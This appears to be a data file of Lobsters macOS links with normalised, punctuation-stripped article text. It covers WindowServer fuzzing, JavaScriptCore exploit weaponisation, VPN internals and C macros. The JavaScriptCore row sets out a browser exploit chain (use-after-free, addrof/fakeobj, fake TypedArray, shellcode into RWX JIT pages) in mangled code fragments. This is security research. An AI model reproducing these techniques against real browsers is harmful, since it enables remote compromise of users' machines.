284,Lobsters,mac,Apple macOS,Cracking the Walls of the Safari Sandbox Fuzzing the macOS WindowServer for Exploitable Vulnerabilit,http://blog.ret2.io/2018/07/25/pwn2own-2018-safari-sandbox/,cracking wall safari sandbox fuzzing macos windowserver exploitable vulnerabilit,arbitrary code execution privilege escalation software sandbox previous post series software sandbox restricting aggravated microsoft edge google chrome mark dowd give way control flow integrity macos sandbox profile app sandbox tinyscheme escaping sandbox iokit remote procedure call documented target selection windowserver attack surface mach subsystem dynamic binary instrumentation inprocess fuzzing frida frida javascript api dumb fuzzing pop culture past vulnerability discovery root cause analysis conclusion,exploiting real world software device achieving arbitrary code execution system may first step towards total compromise high value security conscious target remote code execution often succeeded sandbox escape privilege escalation persistence stage usually require entirely unique exploit making weaponized zerodays exploit considered high risk consumer software modern web browser use software sandbox contain damage event remote compromise exploited apple safari previous post turn focus towards escaping safari sandbox macos effort achieve total system compromise using frida fuzz macos windowserver lockscreen fifth blogpost series discus experience evaluating safari sandbox macos security vulnerability select software component exposed sandbox utilize frida build inprocess fuzzer mean discovering exploitable vulnerability software sandbox software sandboxing often accomplished restricting runtime privilege application platformdependent security feature provided operating system layered appropriately security control limit ability communicate broader system syscall filtering service acls prevent readingwriting file disk block external resource networking tailored specific application sandbox aggressively reduce exposure potentially malicious process preventing process making persistent change machine example compromised sandboxed application ransomware user file disk process permitted filesystem access past several year seen sandbox grow notably secure isolating problematic software brought discussion regarding value theoretically perfect software sandbox properly contained really matter attacker gain arbitrary code execution machine answer question hotly debated amongst security researcher discussion aggravated contrasting approach browser security taken microsoft edge versus google chrome one lead inprocess exploit mitigation edge poster child isolation technology chrome simple barometer result past several year seem indicate sandboxing winning put toetotoe advanced inprocess mitigation countless opinion may case whether trend hold true real world state plainly attacker think sandbox done right add considerable value towards securing software importantly opinion shared many familiar attacking product memory corruption safety dance sa mark dowd however technology improves give way mitigation strict control flow integrity cfi view may change recent revelation wrought meltdown spectre great example putting crack even theoretically perfect sandbox end day sandboxing mitigation technology continue improve evolve mutually exclusive play important role towards raising cost exploitation different way macos sandbox profile macos powerful lowlevel sandboxing technology called apple deprecated publicly favor higher level littletono official documentation available information use former system sandbox learned reverse engineering effort community brief wall seatbeltbased macos sandbox built using rule defined humanreadable sandbox profile sandbox profile live disk seen tailored specific need specific application safari browser sandbox profile comprised following file location may vary systemlibrarysandboxprofilessystemsb systemlibrarystagedframeworkssafariwebkitframeworkversionsaresourcescomapplewebprocesssb macos sandbox profile written language called tinyscheme profile often written whitelist action service required application disallowing access much broader system default version deny default partialsymbolication allow systemaudit filereadmetadata import systemsb processinfo default allow deny allow operation actually need deny processinfo allow processinfopidinfo example sandbox profile whitelist explicit directory file sandboxed application permitted access snippet webproceesssb profile allowing safari readonly access certain directory store user preference disk readonly preference data allow fileread basic system path subpath librarydictionaries subpath libraryfonts subpath libraryframeworks subpath librarymanaged preference subpath libraryspeechsynthesizers serving almost like horse blinder sandbox profile help focus attention attacker listing exactly nonsandboxed resource interface system help enumerate relevant attack surface probed security defect escaping sandbox practice sandbox escape often standalone exploit mean exploit escape browser sandbox almost always entirely unique exploit used achieve initial remote code execution escaping software sandbox common attack code executes outside sandboxed process exploiting kernel application system service running outside sandbox skilled attacker pivot execution context sandbox safari sandbox policy explicitly whitelists number external software attack surface example policy snippet highlight number iokit interface accessed sandbox expose system control required certain feature browser iokit user client allow iokitopen iokituserclientclass applemultitouchdeviceuserclient iokituserclientclass appleupstreamuserclient iokituserclientclass iohidparamuserclient iokituserclientclass rootdomainuserclient iokituserclientclass ioaudiocontroluserclient throughout profile entry begin iokit refer functionality invoke via iokit framework userland client interface one use communicate relevant kernel counterpart kexts another interesting class rule defined sandbox profile fall allow machlookup remote web inspector allow machlookup globalname comapplewebinspector various service required appkit framework allow machlookup globalname comapplefilecoordination globalname comapplefontobjectsserver globalname comapplepowermanagementcontrol globalname comapplesystemconfigurationconfigd globalname comapplesystemconfigurationpppcontroller globalname comappleaudiosystemsoundserverosx globalname comappleanalyticsd globalname comappleaudioaudiohald allow machlookup keyword depicted used permit sandboxed application access various remote procedure call rpc like server hosted within system service policy definition allow application communicate whitelisted rpc server mach ipc additionally explicitly whitelisted xpc service deny machlookup xpcservicenameprefix allow machlookup xpcservicename comappleaccessibilitymediaaccessibilityd xpcservicename comappleaudiosandboxhelper xpcservicename comapplecoremediavideodecoder xpcservicename comapplecoremediavideoencoder xpc higher level ipc used facilitate communication process built top mach ipc xpc fairly well documented wealth resource security research available online interesting avenue attacking nonsandboxed code including making syscalls directly xnu kernel ioctls spend time looking surface due time evaluation sandbox brief knowledge insight extends far interesting exercise future would enumerate attack surface currently restrained sandbox policy target selection surveyed component exposed safari sandbox next step decide felt would easiest target mean escape attacking component live macos kernel attractive successful exploitation guarantee sandbox escape also unrestricted ringzero code execution introduction macos el capitan kernel mode privilege escalation necessary thing loading unsigned driver without disabling sip con attacking kernel code come cost debuggability convenience tooling debug instrument kernel code primitive poorly documented largely nonexistent reproducing bug analyzing crash stabilizing exploit often require full system reboot taxing time morale weighing trait reviewing public research past safari sandbox escape zeroed windowserver complex usermode system service accessible safari sandbox mach ipc allow machlookup globalname comapplewindowserveractive purpose windowserver appeared nearly ideal target nearly every process communicate safari included life userland simplifying debugging introspection run permission essentially equivalent root relatively large attack surface notable history security vulnerability windowserver closedsource private framework library implies developer meant interface directly also mean official documentation nonexistent little information available publicly thin dated simply incomplete windowserver attack surface windowserver work processing incoming machmessages application running system macos machmessages form ipc enable communication running process mach ipc generally used system service expose rpc interface application call hood virtually every gui macos application transparently communicates windowserver hinted name windowserver system service responsible actually drawing application window screen running application tell windowserver via rpc size shape make window put windowserver render virtually desktop application macos familiar microsoft window macos windowserver bit like usermode albeit lesscomplex also responsible drawing mouse cursor managing hotkeys facilitating crossprocess communication among many thing application interface windowserver mach ipc reach rpclike function privileged windowserver system service receives machmessage routed respective message handler coupled foreign data parsed handler function selection windowserver mach message handler attacker function prefixed x xbindsurface represent directly accessible attack surface safari sandbox send arbitrary mach message data windowserver targeting function find vulnerability one function may able exploit service found handler function split among three miggenerated mach subsystem within windowserver subsystem message dispatch routine initially par header incoming mach message pass message specific data appropriate handler via indirect call rax code pointer message handler function selected based incoming message id three dispatch subsystem make ideal place fuzz windowserver inprocess using dynamic binary instrumentation dbi represent generic incoming data delivered individual message handler without reverse engineer surface level function unique message format input discovered lowcost avenue begin automated vulnerability discovery instrumenting chokepoint could fuzz incoming windowserver traffic generated normal user interaction system inprocess fuzzing frida frida dbi framework injects javascript interpreter target process enabling blackbox instrumentation via user provided script may sound like bizarre use javascript model allows rapid prototyping near limitless binary introspection compiled application started frida fuzzing script defining small table instruction wished hook runtime instruction indirect call eg call rax within dispatch routine covered previous section instruction hook offset base reg w call target var target rax windowserversubsystem rcx renezvoussubsystem rax servicessubsystem javascript api provided frida packed functionality allow one snoop modify process runtime using interceptor api possible hook individual instruction place stop introspect process basis hooking code provided function installprobe probeaddress targetregister var probe interceptorattach probeaddress function args var inputmsg args rdi incoming machmsg var outputmsg args rsi response machmsg extract call target symbol name x var calltarget thiscontext targetregister var calltargetname debugsymbolfromaddress calltarget ready read modify replay consolelog message received calltargetname return probe hook instruction defined earlier first resolved base address private skylight framework reside able compute virtual address target instruction runtime using module base offset simple installing interceptor address locate runtime address skylight framework var skylight modulefindbaseaddress skylight consolelog skylight skylight hook target instruction var target var hookaddress ptr skylight add target base offset installprobe hookaddress target consolelog hooked dispatch hookaddress installed message intercept ability record modify replay mach message content passed underlying message handler x function effectively allowed u maninthemiddle mach traffic mig subsystem dump content runtime using frida sniff incoming mach message received windowserver point fuzzing strategy simple used hook flip random bit dumb fuzzing incoming message received windowserver simultaneously recorded bitflips injected fuzzer create log file replaying recorded bitflips fresh instance windowserver gave u degree reproducibility crash produced fuzzer ability consistently reproduce crash priceless trying identify underlying bug sample snippet bitflip replay log looked like following msghbits msghid buffer flipoffset flipmask msghbits msghid buffer msghbits msghid buffer oolbits desccount msghbits msghid buffer flipoffset flipmask msghbits msghid buffer oolbits desccount flipoffset flipmask order fuzzer effective final step required u stimulate system generate windowserver message could accomplished number way letting user navigate around system writing script randomly open application move around careful study pop culture past vulnerability decided simply place weight key advanced persistent threat macos lockscreen holding happens generate reasonable variety message traffic windowserver crash occurred result bitflipping saved replay log crash state disk conveniently windowserver crash macos locked machine restarted bringing u back lockscreen simple python script running background see new windowserver instance pop injecting frida start next round fuzzing lowesteffort lowestcost fuzzer could made target yet still proved fruitful discovery root cause analysis leaving fuzzer run overnight produced number unique mostly useless crash among handful interesting crash one looked particularly promising would require additional investigation replayed bitflip log crash new instance windowserver lldb default macos debugger attached able reproduce issue crashing instruction register state depicted looked like outofbounds read process stopped thread queue comapplemainthread stop reason excbadaccess frame skylight cgxregisterforkey skylight cgxregisterforkey mov rax qword ptr rcx test rax rax je xor ecx ecx target windowserver stopped crashing context appeared totally invalid large another attractive component crash proximity toplevel x function shallow nature crash implied would likely direct control malformed field caused crash lldb bt thread queue comapplemainthread stop reason excbadaccess frame skylight cgxregisterforkey frame skylight xregisterforkey frame frame skylight cgxhandlemessage frame skylight connectionhandler frame skylight postportdata frame skylight runoneserverpass frame skylight cgxrunoneservicespass frame skylight slxserver frame windowserver mhexecuteheader frame libdylddylib start frame libdylddylib start root cause analysis identify bug responsible crash took minute directly prior crash signedunsigned comparison issue within cgxregisterforkey signed comparison vulnerability windowserver windowserver try ensure usercontrolled index parameter six le however check implemented signedinteger comparison mean supplying negative number size eg incorrectly get u past check index field mach message xregisterforkey bit fuzzer flipped happened uppermost bit changing number massive negative value hex binary decimal corrupted bit assuming get currently crashing read succeed careful indexing valid memory minor constraint u look like exploitable write later function write unknown value ecx occur attacker controlled outofbounds index right condition bug appears outofbounds write vulnerability allows memory corruption write generally categorized exploitable condition proven otherwise vulnerability since fixed next post provide standalone poc trigger crash detail constraint make bug rather difficult exploit developing full safari sandbox escape exploit windowserver conclusion escaping software sandbox necessary step towards total system compromise exploiting modern browser used post discus value sandboxing technology standard methodology escape one approach towards evaluating safari sandbox mean escaping reviewing existing resource devised strategy tackle safari sandbox fuzz historically problematic component windowserver simple inprocess fuzzer process demonstrates nothing novel even contrived fuzzers still able find critical realworld bug
285,Lobsters,mac,Apple macOS,macOS VPN architecture from System Preferences down to nesessionmanager,https://blog.timac.org/2018/0717-macos-vpn-architecture/,macos vpn architecture system preference nesessionmanager,rdar apps connect vpn service system preference application architecture preference pane networkprefpane process anpneservice anpneservicesmanager networkextensionframework nesession apis use nesessiont anpneservice nesession apis scnetworkconnectionc daemon architecture summary following article reference update vpnstatus replacement macos builtin vpn status,macos contains builtin vpn client natively support ipsec well post describe part internal architecture macos vpn client information used following article build application replicates functionality vpn status menu bar application also allow auto connect vpn service something currently possible macos apple employee reading blog post find bug report scutil nt support vpn service rdar please note describe undocumented internal apis macos apple could change implementation time note could become outdated give guarantee completely accurate apps connect vpn service macos least builtin application connect vpn service network prefpane system preference application vpn status menu menu bar command line tool scutil scutil let list service scutil nc list timac timac scutil nc list available network connection service current set enabled disconnected ppp ppp also let start vpn connection scutil nc start however command line tool working vpn service vpn status implemented menu extra private api unrelated public nsstatusitem api loaded systemuiserver process binary located path systemlibrarycoreservicesmenu extrasvpnmenu vpn status app seems like smaller target system preference application decided instead analyze network prefpane work main reason attaching debugger network prefpane easier attaching debugger systemuiserver process system preference application architecture system preference application complex application load preference pane created using public preferencepanes framework systemlibraryframeworkspreferencepanesframework plugin architecture well described apple documentation architecture preference pane plugin responsible network preference pane networkprefpane networkprefpane process network preference pane located path systemlibrarypreferencepanesnetworkprefpane least part code run separate process using xpc contentsxpcservicescomapplepreferencenetworkremoteservicexpc network preference pane open separate process comapplepreferencenetworkremoteservice visible anpneservice anpneservicesmanager network preference pane represents different service support using objectivec class anptoplevelservice case really interested anpneservice subclass stripped interface anpneservice class note instance created using neconfiguration object later nesessiont later also note method connect disconnect interface anpneservice anptoplevelservice property retain neconfiguration configuration property assign nesessiont session instancetype initwithconfiguration neconfiguration inconfiguration nsstring name void connect void disconnect end anpneservice service managed anpneservicesmanager singleton stripped interface interface anpneservicesmanager nsobject property retain nsarray anpneservice mservices property assign dispatchqueuet neservicequeue id sharedneservicesmanager void reloadconfigurations void processconfigurations nsarray neconfiguration inconfigurations end anpneservice instance created anpneservicesmanager singleton using neconfiguration received networkextensionframework networkextensionframework note networkextensionframework systemlibraryframeworksnetworkextensionframework public framework however neconfigurationmanager neconfiguration class private class within public framework simplified interface neconfigurationmanager interface neconfigurationmanager nsobject id sharedmanager void loadconfigurationswithcompletionqueue dispatchqueuet completionqueue handler void nsarray neconfiguration nullable configuration nserror nullable error handler end simplified interface neconfiguration interface neconfiguration nsobject property readonly nsuuid identifier property copy nsstring name property copy nevpn vpn end nevpn class also private relies public class nevpnprotocol interface nevpn nsobject property copy nevpnprotocol protocol end nesession apis use nesessiont anpneservice previously mentioned anpneservice instance owns nesessiont let look seen designated initializer anpneservice take neconfiguration object initializer take care creating nesessiont session implementation look like instancetype initwithconfiguration neconfiguration inconfiguration self super init self configuration inconfiguration get configuration identifier initialize nesessiont nsuuid uuid inconfiguration identifier uuidt uuidbytes uuid getuuidbytes uuidbytes session nesessioncreate uuidbytes nesessiontypevpn self setupeventcallback self refreshsession return self session used anpneservice connect method conjunction nesessionstart api void connect nesessionstart self session similarly anpneservice disconnect method us session nesessionstop api void disconnect nesessionstop self session nesession apis nesession apis implemented private dynamic library usrlibsystemlibsystemnetworkextensiondylib extracting nesession apis simple using nm timac timac nm usrlibsystemlibsystemnetworkextensiondylib grep nesession nesessionaddressmatchessubnets nesessionagentgetadvisory nesessionagentgetadvisoryinterfaceindex nesessionalwaysonvpnconfigspresent nesessionappvpnconfigspresent nesessioncancel nesessioncopyappdatafromflowdivertsocket nesessioncopyappdatafromflowdiverttoken nesessioncopypolicymatch nesessioncopysecuritysessioninfo nesessioncopysocketattributes nesessioncreate nesessiondisablerestrictions nesessionenableondemand nesessionestablishipc nesessionfallbackadvisory nesessionfallbackdefault nesessiongetconfigidfromnetworkagent nesessiongetconfigurationid nesessiongetinfo nesessiongetstatus nesessioninfotypetostring nesessioninitializenecpdropall nesessionmanagergetpid nesessionmanagerhasactivesessions nesessionmanagerisrunning nesessionondemandconfigspresent nesessionpolicycopyflowdiverttoken nesessionpolicycopyflowdiverttokenwithkey nesessionpolicymatchgetfilterunit nesessionpolicymatchgetflowdivertunit nesessionpolicymatchgetscopedinterfaceindex nesessionpolicymatchgetservice nesessionpolicymatchgetserviceaction nesessionpolicymatchgetservicetype nesessionpolicymatchisdrop nesessionpolicymatchisflowdivert nesessionpolicymatchserviceisregistered nesessionrelease nesessionretain nesessionsendbarrier nesessionservicegetdnsserviceid nesessionservicematchesaddress nesessionseteventhandler nesessionsetsocketattributes nesessionshoulddisablenexus nesessionstart nesessionstartonbehalfof nesessionstartwithoptions nesessionstatustostring nesessionstop nesessionstopallwithplugintype nesessionstopreasontostring nesessionsystemappvpnconfigspresent nesessiontypetostring nesessionuseassystemvpn case limited number apis really interesting extern nesessiont nesessioncreate uuidt serviceid int sessionconfigtype extern void nesessionrelease nesessiont session extern void nesessionstart nesessiont session extern void nesessionstop nesessiont session extern void nesessioncancel nesessiont session typedef void nesessionseteventhandlerblock xpcobjectt result extern void nesessionseteventhandler nesessiont session dispatchqueuet queue nesessionseteventhandlerblock block typedef void nesessiongetstatusblock nesessionstatust result extern void nesessiongetstatus nesessiont session dispatchqueuet queue nesessiongetstatusblock block finding correct prototype function simplified thanks open source file scnetworkconnectionc nesessionmanager daemon look implementation nesession function note function sending request xpc root dameon nesessionmanager located path usrlibexecnesessionmanager daemon listening command handle method void nesmsession handlecommand fromclient looking logging string find code command ignore restart command pending start command already exists stop current session requested overriding restart command received start command start rejected received start command skip sstart command session state received stop command reason received enable demand command example service started method void createconnectparameterswithstartmessage called architecture daemon scope article architecture summary let summarize vpn architecture system preference application nesessionmanager root daemon following article unveil application called vpnstatus replicate functionality vpn status menu menu bar list vpn service status connect vpn service disconnect vpn service application also add possibility auto connect vpn service application running auto connect vpn service something currently possible macos reference update blog post vpnstatus application available vpnstatus replacement macos builtin vpn status
286,Lobsters,mac,Apple macOS,Weaponization of a JavaScriptCore Vulnerability,https://blog.ret2.io/2018/07/11/pwn2own-2018-jsc-exploit/,weaponization javascriptcore vulnerability,reliability issue security vulnerability arbitrary code execution vulnerability discovered root cause analysis first exploit primitive hardened disclose recognized layering primitive uaf target selection race condition useafterfree float attacking javascript engine saleo forcing useful uaf relative rw primitive limitation relative rw utility typedarrays typedarrays documented generic exploit primitive ieee arbitrary rw primitive arbitrary code execution jit pointer poisoning exploit conclusion,software bug come many shape size sometimes code defect used compromise runtime integrity software distinction help researcher separate simple reliability issue security vulnerability extreme certain vulnerability weaponized meticulously exacerbating asymmetry reach state catastrophic software failure arbitrary code execution post shed light process weaponizing vulnerability safari web browser achieve arbitrary code execution single click unsuspecting victim frequently discussed topic exploit development lifecycle fourth post series weaponized version executing arbitrary code javascriptcore early following along read discovered vulnerability followed walkthrough root cause analysis first post series provides top level discussion full exploit chain exploit primitive developing exploit hardened otherwise complex software often necessary use one vulnerability build known term primitive refers action attacker perform manipulate disclose application runtime eg memory unintended way building block exploit primitive used compromise software integrity bypass modern security mitigation advanced often arbitrary modification runtime memory uncommon exploit string together multiple primitive towards ultimate goal achieving arbitrary code execution general case impractical impossible defend real world application attacker achieve primitive arbitrary rw implies attacker perform number read writes entire address space runtime memory extremely powerful arbitrary rw luxury always feasible necessary exploit present widely recognized point total compromise arbitrary code execution inevitable layering primitive educational perspective javascriptcore exploit developed great illustration layering increasingly powerful primitive look like practice starting discovered vulnerability broken jsc exploit approximately six different phase nurtured exploit primitive forcefully free jsarray butterfly using race condition vulnerability uaf employ freed butterfly gain relative readwrite rw primitive create generic addrof fakeobj exploit primitive using relative rw use generic exploit primitive build arbitrary rw primitive faked typedarray leverage arbitrary rw primitive overwrite readwriteexecute rwx jit page execute arbitrary code said jit page step required u study number different javascriptcore internals learned careful review webkit source code existing literature handson experimentation cover internals post mostly context leveraged build exploit primitive uaf target selection last post learned discovered race condition could used prematurely free type j object putting array calling arrayreverse critical moment create malformed runtime state freed object may continue used called uaf think ability incorrectly free arbitrary j object internal allocation classspecific exploit primitive jsc next step would identify interesting object target free exploit development arraylike structure maintain internal field attractive attacker malicious actor corrupt dynamic length field often able index array far outside usual bound creating powerful exploit primitive corrupting length field arraylike structure allow outofbounds array manipulation within javascriptcore particularly interesting accessible construct match pattern depicted backing butterfly jsarray object butterfly structure used jsc store j object property data array element also maintains length field bound user access storage example following gdb dump diagram show jsarray backing store butterfly filled float represented green field depict internally managed size field backing butterfly dumping jsarray depicting relationship backing butterfly phrack article attacking javascript engine section saleo describes butterfly greater detail jsc store j object property element memory region store pointer region object pointer point middle region property stored left lower address element right also small header located pointed address contains length element vector concept called since value expand left right similar wing next section attempt forcefully free butterfly using vulnerability leave dangling butterfly pointer within live jsarray prone malicious reuse uaf forcing useful uaf due somewhat chaotic nature racecondition want start exploit written javascript constructing top level array contains large number simple better chance freeing least one eg print initializing array var array var new array fill note use float somewhat common browser exploit one native j type allows one read write arbitrary value contiguously backing array butterfly relevant later post target array allocated element attempt trigger race condition repeated use arrayreverse stimulation gc help schedule markandsweeps print starting race v var var j j j vpush new string c repeat stimulate gc successful expect freed one backing butterfly used float array stored within visually result look something like race condition free free butterfly heap leaving jsarray cell intact driving race condition jsarray v eventually grow backing butterfly push backing butterfly get allocated freed butterfly allocation backing butterfly v eventually get reallocated freed butterfly confirm hypothesis inspect length array targeted race condition successful expect find one array abnormal length indication butterfly freed dangling pointer memory owned new object specifically v print checking abnormal array length var length ignore array expected length continue print len lengthtostring snippet provided section make new proofofconcept poc called xjs running short script time observed vulnerability pretty reliably reporting multiple jsarrays abnormal length evidence backing butterfly array freed race condition losing ownership underlying data belongs v poc print abnormal array length found run implying potentially unbounded malformed array explicitly used race condition force uaf one random jsarray butterfly dangling butterfly pointer pointing unknown data used race condition overlay larger living allocation v one freed butterfly point easy demonstrate full control array length teased achieve known exploit primitive relative rw primitive filling larger overlayed butterfly v arbitrary data case float able inadvertently set property pointed one freed jsarray butterfly code one additional line inserted poc vfill putting together approximately sketched far print initializing array var array var new array fill print starting race v var var j j j vpush new string c repeat stimulate gc print filling overlapping butterfly vfill print checking abnormal array length var length ignore array expected length continue print len lengthtostring executing new poc time reliably see multiple array claiming array length corrupted otherwise radically incorrect array length alarming developer poc reliably printing multiple array attackercontrolled unbounded length dangling array butterfly longer bounded valid length pulling one malformed jsarray object using one normally would index far past length read write nearby relative heap memory pull one array abnormal length oobarray write value array index outofbounds write oobarray read memory index array outofbounds read print oobarray able read write outofbounds oob extremely powerful exploit primitive attacker peek poke part runtime memory almost using debugger effectively broken fourth wall application runtime limitation relative rw unfortunately several factor inherent jsarrays limit utility relative rw primitive established previous section chief among limitation length attribute jsarray stored used signed integer problem mean index bound read write heap data close behind butterfly leaf significant portion runtime memory inaccessible relative rw primitive relative access limited forward malformed array print oobarray bad index undefined print oobarray okay print oobarray okay print oobarray okay print oobarray bad index undefined print oobarray bad index undefined next goal build arbitrary rw primitive touch memory anywhere address space application runtime javascriptcore different documented technique achieve level ubiquity discus next section utility typedarrays javascript language specification family object called typedarrays arraylike object allow j developer exercise precise efficient control memory lower level data type typedarrays added javascript facilitate script perform audio video image manipulation within browser natural performant implement type computation direct memory manipulation storage reason typedarrays often interesting tool exploit writer structure typedarray context javascriptcore comprised following component jscell similar jsobjects unused butterfly pointer field pointer underlying typedarray data backing store length mode flag critically backing store user data stored typedarray object actually located memory overwrite backing store pointer pointed address memory diagram typedarray jsobject memory underlying backing store simplest way achieve arbitrary rw would allocate typedarray object somewhere malformed jsarray use relative rw modify backing store pointer address choosing reading writing index typedarray interface memory specified address directly arbitrary rw achieved overwriting backing store pointer within typedarray little time study jsc heap garbage collector algorithm proved difficult u place typedarray near relative rw pure heap fengshui instead employed documented exploitation technique create typedarray achieve result generic exploit primitive faking typedarray requires work lucky heap allocation significantly reliable deterministic practice ability craft fake j object dependent two higher level exploit primitive must build using relative rw addrof provide u memory address javascript object give fakeobj take memory address return javascript object location create addrof primitive first create normal jsarray oobtarget whose butterfly located corrupted jsarray butterfly relative rw javascript place object first index array use relative rw primitive oobarray read address stored object pointer float nearby array oobtarget decoding float ieee form give u address memory b get address given jsobject primsaddrof function x oobtarget x return oobarray oobtargetindex b reverse establish fakeobj primitive achieved using relative rw oobarray write given address oobtarget array butterfly float c reading array index javascript return jsobject pointer stored return jsobject given address primsfakeobj function addr oobarray oobtargetindex addrasdouble c return oobtarget using relative rw primitive created higher level generic exploit primitive help u creating fake javascript object almost extended javascript engine new feature next demonstrate two new primitive used help build fake typedarray object lead u achieve true arbitrary rw primitive arbitrary rw primitive process creating fake typedarray taken directly technique shared phrack article previously referenced post comprehensive discus use method simplify process creating fake typedarray constructed standard jsobject object created form let utarget new utarget fake array structure id guess indexing type mtype float array mflags overridesgetownpropertyslot mcellstate newwhite let jscell new construct object attribute set byte fake object inline obj jscell jscellasdouble butterfly anything unused b false target want write backing store field c utarget length flag new asdouble using jsobject way make easy u set modify object content example easily point arbitrary rw j object placing mock field item jscell complex fake specifically structureid field jscells problematic runtime jsc generates unique structureid class javascript object id used engine determine object type handled attribute runtime know structureid typedarray get around issue need way help ensure valid structureid type object want due lowlevel concept inherent javascriptcore create typedarray object add least one custom attribute javascriptcore assign unique structureid abused fact id making fairly likely could reliably guess id say corresponded typedarray spray structure id see http wwwphrackorgpapersattackingjavascriptengineshtml function spraystructures function randomstring return mathrandom tostring replace az g substr spray array structure id let let new add new property create new structure instance randomstring structspush spraying large number typedarray id created fake typedarray guessed reasonable value structureid safely guessed correctly calling instanceof fake typedarray object instanceof returned knew created typedarray object point access fake typedarray javascript simultaneously control backing store pointer utarget manipulating backing store pointer typedarray grant u full readwrite access entire address space process set data given address primsset function addr arr fakearray addrasdouble utargetset arr read byte given address function addr fakearray addrasdouble let byte array let byte utarget return new byte write byte given address function addr value fakearray addrasdouble utargetset valuebytes arbitrary rw capability hand work towards final goal arbitrary code execution arbitrary code execution macos safarijavascriptcore still us readwriteexecute rwx jit page achieve code execution simply locate one rwx jit page overwrite shellcode first step find pointer one jit page created javascript function object used time ensures function object would logic compiled machine code assigned region rwx jit page build arbitrary jit function basically random junk make jit function larger let jit function x var j j return x x x x j make sure jit function compiled jit jit jit used arbitrary rw primitive addrof inspect function object jit traditionally rwx jit page pointer found somewhere within function object early january patch introduced javascriptcore mitigate spectre cpu sidechannel issue designed hide pointer attacker arbitrary rw required dig bit deeper object unpoisoned jit pointer traverse jsfunction object retrieve nonpoisoned pointer log finding jitpage let jitaddr primsaddrof jit add add add add log jit page addr jitaddr pointer rwx jit page simply plug backing store field fake typedarray write arbitrary write final caveat mindful size shellcode payload copy much code may inadvertently function arbitrary write introducing undesirable instability shellcode overwrite jit code log writing shellcode jit page primsset jitaddradd shellcode gain code execution simply call corresponding function object javascript call jit function execute shellcode log calling jit function jit running full exploit jsc release see trace breakpoint cc shellcode executed implies achieved arbitrary code execution final exploit demonstrating arbitrary code execution release build javascriptcore ubuntu completed exploit little work attacker could embed javascript website pop vulnerable version safari given research development time vulnerability could probably exploited success rate last step involves wrapping javascript based exploit html tuning timing figure slightly work reliably targeting apple safari running real mac hardware victim could experience complete compromise browser simply clicking wrong link navigating malicious website conclusion little prior knowledge javascriptcore vulnerability took approximately manhours study weaponize stabilize discovery testing leading measured success rate safari exploit approximately across run inch macbook pro bought testing jsc exploit landed successfully inch macbook pro three four attempt race condition failing entirely second attempt possibly exacerbated next step zeroday chain escaping safari sandbox compromise entire machine next post discus process evaluating sandbox identify vulnerability led root level privilege escalation system
288,Lobsters,mac,Apple macOS,Macros in C / Objective-C,https://yurylapitsky.com/metamacros,macro c objectivec,macro c objectivec c preprocessor libextc macro gcc manual good style know well enough boy draft sssstringify note link macro concat subscript array accounting summary quite interesting example provided lars wirzenius p thank reading reference github repository c preprocessor documentation gnu reference objcgetprotocol stringinizing c preprocessor trick implementing similar data type,macro c objectivec even c trick suspicious us preprocessor define new syntax c programmer learned bitter experience inventing new syntax confuses maintenance programmer therefore cause bug think however benefit case outweigh potential problem since amount repetitive code saved great lars wirzenius c preprocessor c preprocessor crucial part compilation target assuming target c cbased language larger one file used commonly via include import construction reuse already implemented function class different file sometimes code isolated want limit scope specific target conditional inclusion helpful via ifdef comment point help make code clearer comment needed binary preprocessor silently remove u also use define preprocessor define constant rarely used way nowadays objectivec style became obsolete replaced specifying static variable however preprocessor could also powerful thing completely different perspective using macro recently found interesting idea libextc framework like share macro note article try compete documentation c preproccessor familiar subject worth check something like gcc manual macro rule defines specific pattern replaced specified construction several type macro functionlike macro without parameter nevertheless common following structure define expressiontoreplace replacement define keyword generally starting expression preprocessorrelated start macro definition already mentioned define constant way try build advanced expression hidden shortexpression say better see hundred time hear example macro define appdelegate uiapplication sharedapplication delegate popular time ago io project objectivec actually good style snippet whenever preprocessor find appdelegate used code appdelegate would replaced right part uiapplication sharedapplication delegate appdelegate window uiapplication sharedapplication delegate window usually think macro advanced find replace tool macro could used different purpose like reusing code code generation others painful macro characteristic debug code inside macro macro rule actual code need produced expanding macro using preprocessor however interesting technique help think different term article chosen play metamacrosh libextc metamacros file used several opensource project real example macro used fancy theory real know well enough boy let try one define metamacroexprify vaargs true place passed argument inside first pair round bracket add true end wrapped expression surprisingly provide true result expression return true anonymous function language suspect know enough standard basically following preprocessor produce following completely valid expression compiler may produce warning insert void cast error example printf following output draft left operand comma operator evaluated void expression sequence point evaluation right operand evaluated result type attempt made modify result comma operator access next sequence point behavior undefined sssstringify define metamacrostringify value value c preprocessor treat special symbol value right stringinized example note retrieved example concrete protocol implementation provided libextobjc new objectivec protocol name apple us name interface objectivec support abstract protocol outofthebox interface declare method provide implementation concrete protocol interface provides method declaration also implementation swift support concrete protocol version technique one way get multiple inheritance behavior however know hierarchy limitation link back macro define concreteprotocol name create class used contain method used protocol interface name protocolmethodcontainer nsobject name end implementation name protocolmethodcontainer class loaded runtime add concrete protocol list void load pass actual protocol first parameter class second extaddconcreteprotocol objcgetprotocol metamacrostringify name self fprintf stderr error could load concrete protocol sn metamacrostringify name something else removed insignificant end macro produce class objectivec interface class body provided protocol name line objcgetprotocol metamacrostringify name target see name provided parameter used declaration interface part class name implementation also passed objcgetprotocol parameter function expects const char name stringinizing wrap expanded name value doublequotes name value placed compiler use expression variable try calculate required value http languageobjc http gccgnuorgonlinedocscppstringizinghtml stringizing concat define metamacroconcat b b already know right example usage symbol concatenates left provided argument right one previous concrete protocol macro would use superprotocol name part produced code interface name protocolmethodcontainer nsobject name presented preprocessing interface superprotocolprotocolmethodcontainer nsobject superprotocol using provided macro metamacroconcat produce subscript array macro define metamacroat n metamacroconcat metamacroat n vaargs description say n numerical rest argument used source value example metamacroat b c produce c work see another interesting thing macro could reused inside another macro great way build something advanced back example know metamacroconcat connects provided argument result macro metamacroatn vaargs aha look like specific macro specific n metamacroat expansion define metamacrohead vaargs define metamacrohead vaargs define metamacrohead vaargs define metamacrohead vaargs define metamacrohead vaargs define metamacrohead vaargs define metamacrohead vaargs consequently define metamacrohead metamacrohead vaargs define metamacrohead first first whole logic based macro receives first argument pregenerated sequence argument pregenerated sequence shift element initially right pregenerated element cut related element varargs item cut nth first left right example accounting define metamacroargcount metamacroat vaargs reasonable would able count provided argument logic pregenerated sequence provides actual count varargs shift subscript appropriate number let take example metamacroargcount b c metamacroat b c getting element b c actually argument count equal whole logic build predefined number limited shift beautiful summary macro yet another tool embodying idea source code preprocessor long time helping basic stuff however tool could used much advanced idea like code generation metamacrosh header hint fact think concrete protocol implementation interesting example realworld usage challenge otherwise requires interaction 